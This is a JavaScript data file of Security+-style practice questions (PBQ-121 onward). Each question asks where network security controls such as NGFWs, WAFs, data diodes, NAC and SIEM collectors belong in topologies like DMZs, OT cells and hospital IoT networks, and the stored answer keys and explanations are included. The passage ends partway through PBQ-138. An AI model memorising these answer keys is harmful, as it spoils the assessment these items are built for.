SECPLUS.pbqs.push(
  {
    id: "PBQ-121",
    format: 5,
    domain: 3,
    title: "E-Commerce DMZ Hardening",
    brief: "A retailer hosts a public web storefront in a DMZ behind the Internet edge. You must place controls so HTTP application attacks are filtered and traffic is balanced across the web pool before it reaches back-end servers.",
    exhibitTitle: "topology",
    exhibit: "<span class='dim'>Internet</span>\n     |\n  <span class='cy'>[A]</span>  (edge boundary)\n     |\n  +--<span class='warnc'>DMZ</span>------------------+\n  |   <span class='cy'>[B]</span>  ->  web filtering  |\n  |   <span class='cy'>[C]</span>  ->  spread to pool |\n  |   [ web1 ] [ web2 ] [ web3 ] |\n  +------------------------------+\n     |\n  <span class='ok'>internal app/db tier</span>",
    fields: [
      {
        label: "Control for position [A]",
        hint: "what sits between the Internet and the DMZ",
        options: ["Next-gen firewall (NGFW)", "Load balancer", "Honeypot", "SIEM collector"],
        answer: 0,
        explain: "The Internet edge boundary needs an NGFW to enforce perimeter policy, block unsolicited inbound traffic, and inspect flows before they reach the DMZ."
      },
      {
        label: "Control for position [B]",
        hint: "what inspects HTTP/HTTPS for application-layer attacks",
        options: ["Network TAP", "Web application firewall (WAF)", "VPN concentrator", "NAC"],
        answer: 1,
        explain: "A WAF sits directly in front of the web application to filter SQL injection, XSS, and other Layer 7 attacks that a packet firewall cannot see."
      },
      {
        label: "Control for position [C]",
        hint: "what distributes sessions across the web pool",
        options: ["Forward proxy", "DLP gateway", "Load balancer", "Honeynet"],
        answer: 2,
        explain: "A load balancer sits before the web server pool to distribute incoming sessions, provide health checks, and enable horizontal scaling."
      }
    ],
    summary: "Perimeter NGFW, then WAF for Layer 7 inspection, then a load balancer fronting the web pool is the standard DMZ ingress chain."
  },
  {
    id: "PBQ-122",
    format: 5,
    domain: 3,
    title: "Manufacturing Plant OT Segmentation",
    brief: "A factory must let the corporate network read sensor telemetry from the OT cell without allowing any return path that could let malware reach the PLCs. Place controls to enforce one-way data flow and segment boundary policy.",
    exhibitTitle: "topology",
    exhibit: "<span class='ok'>Corporate IT</span>\n     |\n  <span class='cy'>[A]</span>  (IT/OT boundary)\n     |\n  +--<span class='warnc'>OT DMZ / historian</span>--+\n  |   <span class='cy'>[B]</span>  one-way only |\n  +-----------------------+\n     |\n  +--<span class='hl'>OT CELL (PLCs)</span>------+\n  |   <span class='cy'>[C]</span>  passive view  |\n  |   [ PLC ] [ HMI ] [ RTU ] |\n  +---------------------------+",
    fields: [
      {
        label: "Control for position [A]",
        hint: "policy enforcement at the IT/OT segment boundary",
        options: ["Reverse proxy", "Next-gen firewall (NGFW)", "Email security gateway", "Load balancer"],
        answer: 1,
        explain: "An NGFW at the IT/OT boundary enforces strict segmentation, allowing only defined protocols and blocking everything else between the two zones."
      },
      {
        label: "Control for position [B]",
        hint: "hardware that physically permits flow in only one direction",
        options: ["Air-gap / data diode", "VPN concentrator", "Forward proxy", "NAC"],
        answer: 0,
        explain: "A data diode physically allows telemetry to flow out of OT to the historian while making any return path impossible, protecting the PLCs from inbound attack."
      },
      {
        label: "Control for position [C]",
        hint: "monitor OT traffic without injecting packets",
        options: ["IDS/IPS sensor (passive monitoring)", "WAF", "Honeypot", "DLP gateway"],
        answer: 0,
        explain: "A passive IDS sensor inside the OT cell watches traffic for anomalies without actively interfering with fragile control-system communications."
      }
    ],
    summary: "NGFW segments IT from OT, a data diode guarantees one-way telemetry, and a passive IDS monitors the cell without disrupting PLCs."
  },
  {
    id: "PBQ-123",
    format: 5,
    domain: 3,
    title: "Management VLAN Bastion Access",
    brief: "Administrators must reach a restricted management VLAN only through a single hardened entry point that is logged and monitored. Place controls to create one auditable ingress and feed logs to monitoring.",
    exhibitTitle: "topology",
    exhibit: "<span class='ok'>Admin workstations</span>\n     |\n  <span class='cy'>[A]</span>  segment firewall\n     |\n  +--<span class='warnc'>Mgmt VLAN edge</span>------+\n  |   <span class='cy'>[B]</span>  sole ingress    |\n  +----------------------------+\n     |\n  [ switch ] [ iLO ] [ vCenter ]\n     |\n  <span class='cy'>[C]</span>  -> central logging",
    fields: [
      {
        label: "Control for position [A]",
        hint: "boundary policy in front of the management VLAN",
        options: ["Honeynet", "Next-gen firewall (NGFW)", "Load balancer", "WAF"],
        answer: 1,
        explain: "An NGFW enforces which sources may even attempt to reach the management VLAN, restricting access to admin subnets and approved ports."
      },
      {
        label: "Control for position [B]",
        hint: "the only host admins log into to administer the VLAN",
        options: ["Jump server (bastion)", "Reverse proxy", "Network TAP", "DLP gateway"],
        answer: 0,
        explain: "A jump server (bastion) is the single hardened, audited entry point; admins connect to it first and all management sessions originate there."
      },
      {
        label: "Control for position [C]",
        hint: "where device and session logs are aggregated",
        options: ["VPN concentrator", "SIEM collector", "Forward proxy", "NAC"],
        answer: 1,
        explain: "A SIEM collector aggregates logs from the management devices and bastion so all privileged activity is centrally recorded and alertable."
      }
    ],
    summary: "An NGFW restricts who can reach the VLAN, a jump server provides the only audited ingress, and a SIEM collector centralizes the logs."
  },
  {
    id: "PBQ-124",
    format: 5,
    domain: 3,
    title: "Hospital Medical IoT Network",
    brief: "A hospital connects vulnerable medical IoT devices and must verify device posture before granting network access while keeping device traffic visible to security monitoring. Place the access and monitoring controls.",
    exhibitTitle: "topology",
    exhibit: "<span class='ok'>Clinical core switch</span>\n     |\n  <span class='cy'>[A]</span>  admission control\n     |\n  +--<span class='warnc'>Medical IoT VLAN</span>----+\n  |   [ pump ] [ monitor ] [ MRI ] |\n  +--------------------------------+\n     |\n  <span class='cy'>[B]</span>  -> copy traffic to:\n     |\n  <span class='cy'>[C]</span>  detection engine",
    fields: [
      {
        label: "Control for position [A]",
        hint: "decides whether a device may join the VLAN by posture",
        options: ["Network access control (NAC)", "WAF", "Load balancer", "Reverse proxy"],
        answer: 0,
        explain: "NAC authenticates and posture-checks each medical device before it is admitted to the VLAN, quarantining noncompliant or unknown devices."
      },
      {
        label: "Control for position [B]",
        hint: "hardware that mirrors traffic for inspection",
        options: ["VPN concentrator", "Network TAP", "Forward proxy", "Data diode"],
        answer: 1,
        explain: "A network TAP passively copies all VLAN traffic to security tools without affecting the fragile medical devices or adding latency."
      },
      {
        label: "Control for position [C]",
        hint: "analyzes the mirrored traffic for malicious activity",
        options: ["Honeypot", "Email security gateway", "IDS/IPS sensor", "Load balancer"],
        answer: 2,
        explain: "An IDS/IPS sensor receives the TAP feed and inspects medical IoT traffic for exploits and anomalies these unpatchable devices cannot defend themselves against."
      }
    ],
    summary: "NAC gates device admission, a TAP mirrors the traffic, and an IDS sensor analyzes it for threats to vulnerable medical IoT."
  },
  {
    id: "PBQ-125",
    format: 5,
    domain: 3,
    title: "Multi-Tier Cloud Web Application",
    brief: "A SaaS app runs in a cloud VPC with public and private subnets. Inbound HTTPS must be terminated and filtered, then distributed to a stateless app tier, while outbound calls from the app are inspected. Place the controls.",
    exhibitTitle: "topology",
    exhibit: "<span class='dim'>Internet</span>\n     |\n  +--<span class='warnc'>Public subnet</span>--------+\n  |   <span class='cy'>[A]</span>  L7 filtering    |\n  |   <span class='cy'>[B]</span>  distribute load |\n  +----------------------------+\n     |\n  +--<span class='ok'>Private subnet (app)</span>--+\n  |   [ app1 ] [ app2 ]         |\n  |   <span class='cy'>[C]</span>  egress inspect   |\n  +-----------------------------+",
    fields: [
      {
        label: "Control for position [A]",
        hint: "filters HTTP attacks at the public edge of the VPC",
        options: ["Web application firewall (WAF)", "NAC", "Jump server", "Network TAP"],
        answer: 0,
        explain: "A cloud WAF inspects inbound HTTPS at the public subnet edge, blocking OWASP Top 10 attacks before they reach the app tier."
      },
      {
        label: "Control for position [B]",
        hint: "spreads requests across the stateless app instances",
        options: ["Honeypot", "Load balancer", "DLP gateway", "Data diode"],
        answer: 1,
        explain: "A load balancer distributes filtered requests across the stateless app instances and supports auto-scaling and health checks."
      },
      {
        label: "Control for position [C]",
        hint: "controls and inspects outbound connections from the app",
        options: ["Reverse proxy", "WAF", "Forward / web proxy", "VPN concentrator"],
        answer: 2,
        explain: "A forward (egress) proxy inspects and restricts outbound traffic from the app instances, preventing data exfiltration and command-and-control callbacks."
      }
    ],
    summary: "A WAF filters inbound L7 traffic, a load balancer spreads it across the app tier, and a forward proxy governs egress for exfiltration control."
  },
  {
    id: "PBQ-126",
    format: 5,
    domain: 3,
    title: "Remote Workforce Secure Access",
    brief: "Remote employees connect over the Internet and must terminate encrypted tunnels at the edge and have their devices checked before reaching internal resources. Place the remote-access controls.",
    exhibitTitle: "topology",
    exhibit: "<span class='dim'>Remote users (Internet)</span>\n     |\n  <span class='cy'>[A]</span>  perimeter policy\n     |\n  <span class='cy'>[B]</span>  tunnel termination\n     |\n  <span class='cy'>[C]</span>  device posture check\n     |\n  <span class='ok'>Internal resources</span>",
    fields: [
      {
        label: "Control for position [A]",
        hint: "edge boundary policy enforcement",
        options: ["Next-gen firewall (NGFW)", "Load balancer", "Honeypot", "Reverse proxy"],
        answer: 0,
        explain: "An NGFW at the perimeter enforces which inbound services (such as the VPN listener) are exposed and inspects allowed traffic."
      },
      {
        label: "Control for position [B]",
        hint: "where encrypted client tunnels are terminated",
        options: ["DLP gateway", "VPN concentrator", "Network TAP", "WAF"],
        answer: 1,
        explain: "A VPN concentrator terminates the remote-access encrypted tunnels at the edge, authenticating users and decrypting traffic for inspection."
      },
      {
        label: "Control for position [C]",
        hint: "verifies endpoint health before granting internal access",
        options: ["Network access control (NAC)", "Load balancer", "Forward proxy", "Honeynet"],
        answer: 0,
        explain: "NAC posture-checks the remote endpoint after tunnel establishment, granting internal access only to compliant, healthy devices."
      }
    ],
    summary: "An NGFW enforces edge policy, a VPN concentrator terminates the tunnels, and NAC posture-checks devices before internal access."
  },
  {
    id: "PBQ-127",
    format: 5,
    domain: 3,
    title: "PCI Cardholder Data Environment",
    brief: "A segmented PCI CDE hosts payment processing. Inbound app traffic must be filtered, outbound flows must be checked for card data leakage, and an isolated decoy must lure attackers away from the real CDE. Place the controls.",
    exhibitTitle: "topology",
    exhibit: "<span class='dim'>Internet</span>\n     |\n  <span class='cy'>[A]</span>  app-layer filter\n     |\n  +--<span class='hl'>CDE segment</span>----------+\n  |   [ payment app ] [ db ]    |\n  |   <span class='cy'>[B]</span>  egress data check |\n  +-----------------------------+\n     |\n  +--<span class='warnc'>Isolated decoy net</span>---+\n  |   <span class='cy'>[C]</span>  fake CDE assets   |\n  +-----------------------------+",
    fields: [
      {
        label: "Control for position [A]",
        hint: "filters HTTP attacks before the payment app",
        options: ["Web application firewall (WAF)", "VPN concentrator", "Load balancer", "NAC"],
        answer: 0,
        explain: "PCI DSS requires a WAF (or equivalent) in front of public-facing payment applications to block application-layer attacks on cardholder data."
      },
      {
        label: "Control for position [B]",
        hint: "inspects outbound flows for card numbers leaving the CDE",
        options: ["Reverse proxy", "DLP gateway", "Honeypot", "Network TAP"],
        answer: 1,
        explain: "A DLP gateway inspects egress traffic for cardholder data patterns, blocking or alerting on PAN exfiltration out of the CDE."
      },
      {
        label: "Control for position [C]",
        hint: "decoy asset in an isolated segment to detect intruders",
        options: ["Load balancer", "Forward proxy", "Honeypot / honeynet", "WAF"],
        answer: 2,
        explain: "A honeypot in an isolated decoy segment lures and detects attackers probing the CDE, generating high-fidelity alerts with no production risk."
      }
    ],
    summary: "A WAF filters inbound app attacks, a DLP gateway stops card-data egress, and an isolated honeypot detects intruders targeting the CDE."
  },
  {
    id: "PBQ-128",
    format: 5,
    domain: 3,
    title: "Inbound Web Publishing Layer",
    brief: "An organization publishes several internal web apps to the Internet through a single edge and wants to hide internal hostnames, terminate TLS centrally, and balance load to identical app servers. Place the controls.",
    exhibitTitle: "topology",
    exhibit: "<span class='dim'>Internet</span>\n     |\n  <span class='cy'>[A]</span>  edge boundary\n     |\n  +--<span class='warnc'>DMZ</span>--------------------+\n  |   <span class='cy'>[B]</span>  TLS term + hide hosts |\n  |   <span class='cy'>[C]</span>  balance to pool       |\n  |   [ app1 ] [ app2 ] [ app3 ]   |\n  +--------------------------------+",
    fields: [
      {
        label: "Control for position [A]",
        hint: "perimeter packet/policy enforcement",
        options: ["Next-gen firewall (NGFW)", "Honeynet", "DLP gateway", "NAC"],
        answer: 0,
        explain: "An NGFW at the edge enforces perimeter rules and only forwards permitted web traffic into the DMZ publishing layer."
      },
      {
        label: "Control for position [B]",
        hint: "terminates TLS and presents one front for internal apps",
        options: ["Forward proxy", "Reverse proxy", "VPN concentrator", "Network TAP"],
        answer: 1,
        explain: "A reverse proxy terminates TLS, hides internal hostnames and structure, and presents a single public face for the internal web apps."
      },
      {
        label: "Control for position [C]",
        hint: "distributes connections to identical app servers",
        options: ["Load balancer", "Honeypot", "Email security gateway", "Air-gap"],
        answer: 0,
        explain: "A load balancer distributes connections across the identical app servers, providing scaling and failover behind the reverse proxy."
      }
    ],
    summary: "NGFW at the edge, a reverse proxy to terminate TLS and mask internals, and a load balancer to spread load across the app pool."
  },
  {
    id: "PBQ-129",
    format: 5,
    domain: 3,
    title: "Corporate Email Ingress Protection",
    brief: "A company must scan all inbound email for malware and phishing before delivery, prevent users from reaching malicious sites, and detect attackers who slip past the perimeter. Place the controls across the path.",
    exhibitTitle: "topology",
    exhibit: "<span class='dim'>Internet</span>\n     |\n  <span class='cy'>[A]</span>  mail scanning\n     |\n  +--<span class='ok'>Corporate LAN</span>----------+\n  |   [ users ] [ mail server ]   |\n  |   <span class='cy'>[B]</span>  web access control  |\n  +-------------------------------+\n     |\n  <span class='cy'>[C]</span>  decoy trap segment",
    fields: [
      {
        label: "Control for position [A]",
        hint: "filters inbound messages for malware and phishing",
        options: ["Email security gateway", "Load balancer", "Reverse proxy", "Data diode"],
        answer: 0,
        explain: "An email security gateway scans inbound mail for malware, phishing, and spam before messages are delivered to the internal mail server."
      },
      {
        label: "Control for position [B]",
        hint: "controls and filters user outbound web browsing",
        options: ["WAF", "Forward / web proxy", "VPN concentrator", "Network TAP"],
        answer: 1,
        explain: "A forward/web proxy filters user web browsing, blocking known-malicious sites and enforcing acceptable-use policy on outbound HTTP."
      },
      {
        label: "Control for position [C]",
        hint: "decoy to catch attackers that bypass the perimeter",
        options: ["Honeypot / honeynet", "Load balancer", "NAC", "Reverse proxy"],
        answer: 0,
        explain: "A honeypot in a trap segment detects lateral movement by attackers who got past the perimeter, since any contact with it is inherently suspicious."
      }
    ],
    summary: "An email security gateway scans inbound mail, a forward proxy controls outbound browsing, and a honeypot traps post-breach attackers."
  },
  {
    id: "PBQ-130",
    format: 5,
    domain: 3,
    title: "Power Utility SCADA Boundary",
    brief: "A utility must collect SCADA data into an IT historian with absolutely no inbound path to the control network, while watching the control LAN for anomalies and gating engineering laptops by posture. Place the controls.",
    exhibitTitle: "topology",
    exhibit: "<span class='ok'>IT historian</span>\n     |\n  <span class='cy'>[A]</span>  one-way transfer\n     |\n  +--<span class='hl'>Control LAN (SCADA)</span>--+\n  |   [ RTU ] [ master ] [ relay ] |\n  |   <span class='cy'>[B]</span>  anomaly monitor      |\n  +--------------------------------+\n     |\n  <span class='cy'>[C]</span>  engineering laptop gate",
    fields: [
      {
        label: "Control for position [A]",
        hint: "hardware-enforced one-way path out of SCADA",
        options: ["Air-gap / data diode", "Load balancer", "Reverse proxy", "WAF"],
        answer: 0,
        explain: "A data diode physically enforces one-way data flow from the control LAN to the IT historian, making any inbound connection to SCADA impossible."
      },
      {
        label: "Control for position [B]",
        hint: "passively watches control traffic for anomalies",
        options: ["Honeypot", "IDS/IPS sensor", "DLP gateway", "VPN concentrator"],
        answer: 1,
        explain: "A passive IDS sensor monitors SCADA traffic for anomalous commands or scanning without injecting packets that could disturb control systems."
      },
      {
        label: "Control for position [C]",
        hint: "checks engineering devices before they connect",
        options: ["Load balancer", "Network access control (NAC)", "Forward proxy", "Honeynet"],
        answer: 1,
        explain: "NAC verifies that engineering laptops are authorized and compliant before allowing them onto the sensitive control LAN."
      }
    ],
    summary: "A data diode guarantees one-way SCADA telemetry, an IDS sensor monitors the control LAN, and NAC gates engineering devices."
  },
  {
    id: "PBQ-131",
    format: 5,
    domain: 3,
    title: "Internal Server Farm Protection",
    brief: "An internal data-center segment hosts critical application and database servers. You must enforce segment policy, balance traffic to the app pool, and aggregate server logs for monitoring. Place the controls.",
    exhibitTitle: "topology",
    exhibit: "<span class='ok'>Internal core</span>\n     |\n  <span class='cy'>[A]</span>  segment boundary\n     |\n  +--<span class='warnc'>Server farm</span>------------+\n  |   <span class='cy'>[B]</span>  spread to app pool   |\n  |   [ app1 ] [ app2 ] [ db ]    |\n  |   <span class='cy'>[C]</span>  -> log aggregation   |\n  +-------------------------------+",
    fields: [
      {
        label: "Control for position [A]",
        hint: "policy enforcement at the data-center segment edge",
        options: ["Next-gen firewall (NGFW)", "Honeypot", "Email security gateway", "VPN concentrator"],
        answer: 0,
        explain: "An NGFW at the server-farm boundary enforces east-west segmentation, restricting which internal sources may reach the critical servers."
      },
      {
        label: "Control for position [B]",
        hint: "distributes internal client requests to the app pool",
        options: ["DLP gateway", "Load balancer", "Forward proxy", "Data diode"],
        answer: 1,
        explain: "A load balancer in front of the app pool distributes internal requests and provides health checks and failover for the application tier."
      },
      {
        label: "Control for position [C]",
        hint: "collects server logs for central analysis",
        options: ["Reverse proxy", "WAF", "SIEM collector", "NAC"],
        answer: 2,
        explain: "A SIEM collector aggregates logs from the server farm so activity is centrally retained, correlated, and available for alerting and forensics."
      }
    ],
    summary: "An NGFW enforces segment policy, a load balancer fronts the app pool, and a SIEM collector centralizes server-farm logs."
  },
  {
    id: "PBQ-132",
    format: 5,
    domain: 3,
    title: "Branch Office to Cloud Backhaul",
    brief: "A branch office routes its traffic to a cloud VPC. Site-to-site tunnels must terminate at the cloud edge, inbound web apps must be filtered, and outbound user browsing must be inspected. Place the controls.",
    exhibitTitle: "topology",
    exhibit: "<span class='dim'>Branch office</span>\n     |\n  <span class='cy'>[A]</span>  site tunnel endpoint\n     |\n  +--<span class='warnc'>Cloud VPC edge</span>--------+\n  |   <span class='cy'>[B]</span>  inbound web filter  |\n  |   <span class='cy'>[C]</span>  outbound web filter |\n  +-------------------------------+\n     |\n  <span class='ok'>Workloads + Internet egress</span>",
    fields: [
      {
        label: "Control for position [A]",
        hint: "terminates the site-to-site encrypted tunnel",
        options: ["VPN concentrator", "Load balancer", "Honeypot", "WAF"],
        answer: 0,
        explain: "A VPN concentrator terminates the site-to-site tunnel from the branch at the cloud edge, authenticating and decrypting the backhaul traffic."
      },
      {
        label: "Control for position [B]",
        hint: "filters inbound HTTP attacks against cloud web apps",
        options: ["Data diode", "Web application firewall (WAF)", "NAC", "Network TAP"],
        answer: 1,
        explain: "A WAF filters inbound HTTP/HTTPS attacks against the cloud-hosted web applications, blocking Layer 7 exploits."
      },
      {
        label: "Control for position [C]",
        hint: "inspects users' outbound Internet browsing",
        options: ["Reverse proxy", "Honeynet", "Forward / web proxy", "Load balancer"],
        answer: 2,
        explain: "A forward/web proxy inspects and filters outbound user browsing from the branch through the cloud, enforcing policy and blocking malicious sites."
      }
    ],
    summary: "A VPN concentrator terminates the site tunnel, a WAF filters inbound web traffic, and a forward proxy governs outbound browsing."
  },
  {
    id: "PBQ-133",
    format: 5,
    domain: 3,
    title: "University Research DMZ",
    brief: "A university exposes a research portal and wants to study attacker behavior, balance portal load, and centralize security event data. Place the controls across the edge and DMZ.",
    exhibitTitle: "topology",
    exhibit: "<span class='dim'>Internet</span>\n     |\n  +--<span class='warnc'>Research DMZ</span>---------+\n  |   <span class='cy'>[A]</span>  balance portal     |\n  |   [ portal1 ] [ portal2 ]    |\n  |   <span class='cy'>[B]</span>  attacker study net |\n  +------------------------------+\n     |\n  <span class='cy'>[C]</span>  -> event aggregation\n     |\n  <span class='ok'>Campus core</span>",
    fields: [
      {
        label: "Control for position [A]",
        hint: "distributes load across the portal servers",
        options: ["Load balancer", "Data diode", "Email security gateway", "NAC"],
        answer: 0,
        explain: "A load balancer spreads incoming sessions across the portal servers, providing scaling and resilience for the public research portal."
      },
      {
        label: "Control for position [B]",
        hint: "decoy environment to observe attacker techniques",
        options: ["Reverse proxy", "Honeynet / honeypot", "VPN concentrator", "WAF"],
        answer: 1,
        explain: "A honeynet provides an isolated decoy environment where researchers can safely observe and study attacker techniques without risking production."
      },
      {
        label: "Control for position [C]",
        hint: "aggregates DMZ security events for monitoring",
        options: ["Forward proxy", "Load balancer", "SIEM collector", "Data diode"],
        answer: 2,
        explain: "A SIEM collector aggregates events from the DMZ and honeynet, correlating activity for monitoring and incident response."
      }
    ],
    summary: "A load balancer fronts the portal, a honeynet captures attacker behavior, and a SIEM collector aggregates the events."
  },
  {
    id: "PBQ-134",
    format: 5,
    domain: 3,
    title: "Financial API Gateway Tier",
    brief: "A bank exposes partner APIs. Inbound calls must be filtered for application attacks, terminated and routed by a proxy, and outbound responses checked so sensitive account data does not leak. Place the controls.",
    exhibitTitle: "topology",
    exhibit: "<span class='dim'>Partners (Internet)</span>\n     |\n  <span class='cy'>[A]</span>  L7 attack filter\n     |\n  +--<span class='warnc'>API DMZ</span>--------------+\n  |   <span class='cy'>[B]</span>  terminate + route   |\n  |   [ api1 ] [ api2 ]          |\n  +------------------------------+\n     |\n  <span class='cy'>[C]</span>  egress data check\n     |\n  <span class='hl'>Core banking</span>",
    fields: [
      {
        label: "Control for position [A]",
        hint: "filters application-layer attacks against the APIs",
        options: ["Web application firewall (WAF)", "Load balancer", "Honeypot", "Data diode"],
        answer: 0,
        explain: "A WAF filters inbound API calls for injection, abuse, and other Layer 7 attacks before they reach the partner-facing API servers."
      },
      {
        label: "Control for position [B]",
        hint: "terminates TLS and routes to the right API backend",
        options: ["Forward proxy", "Reverse proxy", "VPN concentrator", "Network TAP"],
        answer: 1,
        explain: "A reverse proxy terminates TLS and routes requests to the appropriate API backend while hiding internal topology from partners."
      },
      {
        label: "Control for position [C]",
        hint: "checks outbound responses for sensitive data leakage",
        options: ["NAC", "Load balancer", "DLP gateway", "Honeynet"],
        answer: 2,
        explain: "A DLP gateway inspects outbound API responses to ensure sensitive account data is not over-shared or exfiltrated through the partner channel."
      }
    ],
    summary: "A WAF filters inbound API attacks, a reverse proxy terminates and routes, and a DLP gateway guards against sensitive-data egress."
  },
  {
    id: "PBQ-135",
    format: 5,
    domain: 3,
    title: "Water Treatment OT Remote Vendor Access",
    brief: "A water utility must let a vendor support OT equipment without exposing the control cell directly. Vendor sessions must funnel through one audited host, telemetry must flow out one-way, and the cell must be monitored. Place the controls.",
    exhibitTitle: "topology",
    exhibit: "<span class='dim'>Vendor (Internet)</span>\n     |\n  <span class='cy'>[A]</span>  sole audited ingress\n     |\n  +--<span class='hl'>OT control cell</span>------+\n  |   [ PLC ] [ HMI ] [ pump ]   |\n  |   <span class='cy'>[B]</span>  passive monitor    |\n  +------------------------------+\n     |\n  <span class='cy'>[C]</span>  one-way to historian\n     |\n  <span class='ok'>IT historian</span>",
    fields: [
      {
        label: "Control for position [A]",
        hint: "single hardened host the vendor must go through",
        options: ["Jump server (bastion)", "Load balancer", "WAF", "Reverse proxy"],
        answer: 0,
        explain: "A jump server is the single audited ingress; the vendor authenticates to it and all OT access is brokered and logged through that one host."
      },
      {
        label: "Control for position [B]",
        hint: "watches the OT cell without injecting traffic",
        options: ["IDS/IPS sensor (passive)", "DLP gateway", "Email security gateway", "Load balancer"],
        answer: 0,
        explain: "A passive IDS sensor monitors the control cell for anomalous or malicious activity without interfering with sensitive OT communications."
      },
      {
        label: "Control for position [C]",
        hint: "hardware enforcing one-way telemetry to IT",
        options: ["VPN concentrator", "Air-gap / data diode", "Forward proxy", "Honeypot"],
        answer: 1,
        explain: "A data diode physically enforces one-way telemetry from the OT cell to the IT historian, so the historian path can never become an inbound attack vector."
      }
    ],
    summary: "A jump server is the only audited vendor ingress, a passive IDS monitors the cell, and a data diode keeps historian flow one-way."
  }
);
SECPLUS.pbqs.push(
{
  id: "PBQ-136",
  format: 5,
  domain: 3,
  title: "Financial Trading Firm - Market Data Edge",
  brief: "A low-latency trading firm must protect its internet edge while exposing a hardened portal to brokers and inspecting outbound analyst traffic. Select the correct control for each labeled position.",
  exhibitTitle: "Trading Firm Edge Topology",
  exhibit: "<span class='dim'>INTERNET</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- first inline device, blocks/permits by 5-tuple + app-ID\n   |\n   +--> <span class='hl'>Broker Portal (HTTPS, internet-facing app)</span>\n   |        ^\n   |       [B] <span class='cy'>______</span>  <-- inspects HTTP for SQLi/XSS before app\n   |\n   +--> <span class='ok'>Analyst Workstations (outbound web)</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- mediates/filters/caches outbound web requests\n   |\n   +--> <span class='warnc'>Span/mirror port feed</span>\n            |\n           [D] <span class='cy'>______</span>  <-- passive copy of traffic for the monitoring stack",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Inline perimeter enforcement with application awareness.",
      options: ["VPN concentrator", "NGFW", "Honeypot", "Load balancer"],
      answer: 1,
      explain: "The first inline edge device enforcing by 5-tuple plus application identity is a Next-Generation Firewall (NGFW). A VPN concentrator terminates tunnels, a honeypot is a decoy, and a load balancer distributes sessions - none provide the perimeter allow/deny enforcement described."
    },
    {
      label: "Control for position [B]",
      hint: "Protects a specific internet-facing web app from layer-7 attacks.",
      options: ["IDS/IPS", "WAF", "Forward proxy", "Network TAP"],
      answer: 1,
      explain: "A Web Application Firewall (WAF) sits in front of the broker portal and inspects HTTP/HTTPS for SQLi, XSS, and other app-layer attacks. A generic IDS/IPS is not application-tuned, a forward proxy serves outbound clients, and a TAP only copies traffic."
    },
    {
      label: "Control for position [C]",
      hint: "Sits between internal clients and the web; can filter and cache.",
      options: ["Reverse proxy", "WAF", "Forward/web proxy", "Data diode"],
      answer: 2,
      explain: "Outbound analyst web traffic is mediated by a forward (web) proxy, which can filter URLs, enforce policy, and cache. A reverse proxy fronts servers, a WAF protects apps, and a data diode is a one-way OT control - none fit outbound client web filtering."
    },
    {
      label: "Control for position [D]",
      hint: "Receives a passive copy from a mirror/span port.",
      options: ["Network TAP", "NGFW", "NAC", "Reverse proxy"],
      answer: 0,
      explain: "A network TAP (or the device consuming a span/mirror feed) passively copies traffic for monitoring without sitting inline. An NGFW and NAC are enforcement points, and a reverse proxy is an application gateway."
    }
  ],
  summary: "Edge enforcement uses an NGFW; the public app is shielded by a WAF; outbound users go through a forward proxy; and passive monitoring is fed by a TAP."
},
{
  id: "PBQ-137",
  format: 5,
  domain: 3,
  title: "University Campus - BYOD Onboarding",
  brief: "A university must admission-control thousands of unmanaged student devices, give staff secure remote access, and inspect residence-hall traffic. Choose the control for each slot.",
  exhibitTitle: "Campus BYOD Topology",
  exhibit: "<span class='ok'>Student/Staff Devices (BYOD, unmanaged)</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- posture-checks devices, assigns VLAN before LAN access\n   |\n   v\n<span class='dim'>Campus Core</span>\n   |\n   +--> <span class='warnc'>Remote Staff over Internet</span>\n   |        |\n   |       [B] <span class='cy'>______</span>  <-- terminates encrypted remote-access tunnels\n   |\n   +--> <span class='hl'>Residence Hall uplink (high abuse risk)</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- detects/blocks malicious flows inline\n   |\n   +--> <span class='dim'>Log/Event aggregation</span>\n            |\n           [D] <span class='cy'>______</span>  <-- forwards normalized events to central analytics",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Decides who/what gets on the network based on posture.",
      options: ["NAC", "WAF", "VPN concentrator", "Honeypot"],
      answer: 0,
      explain: "Network Access Control (NAC) posture-checks unmanaged BYOD devices and assigns them to the correct VLAN before granting LAN access. A WAF protects web apps, a VPN concentrator handles tunnels, and a honeypot is a decoy."
    },
    {
      label: "Control for position [B]",
      hint: "Aggregates encrypted remote-access connections.",
      options: ["Reverse proxy", "VPN concentrator", "Load balancer", "Network TAP"],
      answer: 1,
      explain: "A VPN concentrator terminates and aggregates encrypted remote-access tunnels for staff. A reverse proxy and load balancer front servers; a TAP only mirrors traffic."
    },
    {
      label: "Control for position [C]",
      hint: "Inline signature/behavior blocking of malicious flows.",
      options: ["IDS/IPS", "DLP gateway", "CASB", "Jump server"],
      answer: 0,
      explain: "An inline IDS/IPS detects and blocks malicious traffic on the high-risk residence-hall uplink. DLP focuses on data exfiltration, a CASB governs cloud SaaS, and a jump server is an admin pivot host."
    },
    {
      label: "Control for position [D]",
      hint: "Collects and forwards logs to central analysis.",
      options: ["SIEM collector", "Forward proxy", "NGFW", "Data diode"],
      answer: 0,
      explain: "A SIEM collector gathers and normalizes events, forwarding them to central analytics. A forward proxy, NGFW, and data diode do not perform log aggregation/forwarding as their primary role."
    }
  ],
  summary: "BYOD is gated by NAC, staff connect through a VPN concentrator, the risky dorm uplink is policed by IDS/IPS, and logs flow through a SIEM collector."
},
{
  id: "PBQ-138",
  format: 5,
  domain: 3,
  title: "Smart Building - IoT Segmentation",
  brief: "A smart-building operator must isolate building-automation IoT, mediate its cloud telemetry, and let technicians administer controllers safely. Place each control.",
  exhibitTitle: "Smart Building IoT Topology",
  exhibit: "<span class='warnc'>HVAC / Lighting / Sensors (IoT, weak stacks)</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- enforces device identity + isolates IoT VLAN onto LAN\n   |\n   v\n<span class='dim'>Building Network</span>\n   |\n   +--> <span class='hl'>Cloud telemetry to vendor SaaS</span>\n   |        |\n   |       [B] <span class='cy'>______</span>  <-- visibility/policy broker for sanctioned cloud usage\n   |\n   +--> <span class='ok'>Technician admin path to controllers</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- single hardened hop technicians use to reach controllers\n   |\n   +--> <span class='dim'>Internet egress</span>\n            |\n           [D] <span class='cy'>______</span>  <-- inline edge allow/deny + app inspection",
  fields: [
    {
      label: "Control for position [A]",
